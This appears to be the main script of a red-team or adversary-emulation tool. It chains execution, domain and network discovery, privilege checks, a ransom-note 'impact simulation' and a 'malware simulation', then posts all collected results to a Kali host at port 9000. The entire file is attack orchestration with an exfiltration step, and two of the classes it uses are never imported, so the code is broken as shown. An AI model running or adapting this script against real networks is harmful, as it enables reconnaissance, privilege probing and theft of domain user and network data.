from modules.execution import ExecutionModule
from modules.discovery import DiscoveryModule
from modules.privesc import PrivEscModule
from modules.exfiltration import ExfiltrationModule

def main():
    exec_mod = ExecutionModule()
    disc_mod = DiscoveryModule()
    pe_mod = PrivEscModule()

    results = {}

    # MODULE 1
    results["execution"] = exec_mod.run_cmd("whoami")

    # MODULE 2
    results["domain"] = disc_mod.domain_info()
    results["domain_users"] = disc_mod.domain_users()
    results["network"] = disc_mod.network_info()

    # MODULE 3
    results["admin_check"] = pe_mod.check_admin()
    results["token_privs"] = pe_mod.whoami_privs()
    results["uac"] = pe_mod.uac_status()

    # -------------------------
    # MODULE 7 — IMPACT SIMULATION (OPTIONAL)
    # -------------------------
    ENABLE_IMPACT_SIMULATION = True

    if ENABLE_IMPACT_SIMULATION:
        print("[*] Running Impact Simulation Module")

        impact = ImpactSimulationModule()
        impact.setup_test_data()
        impacted_files = impact.simulate_impact()
        impact.drop_ransom_note()

        results["impact_simulation"] = impact.generate_report(impacted_files)

    # -------------------------
    # MODULE 8 — MALWARE BEHAVIOR SIMULATION (OPTIONAL)
    # -------------------------
    ENABLE_MALWARE_SIMULATION = True

    if ENABLE_MALWARE_SIMULATION:
        print("[*] Running Malware Behavior Simulation")

        malware = MalwareSimulationModule()
        malware.create_marker()

        results["malware_simulation"] = malware.generate_report()


    # EXFILTRATION
    exfil = ExfiltrationModule("http://<KALI_IP>:9000/collect")
    exfil.send(results)

if __name__ == "__main__":
    main()
   
 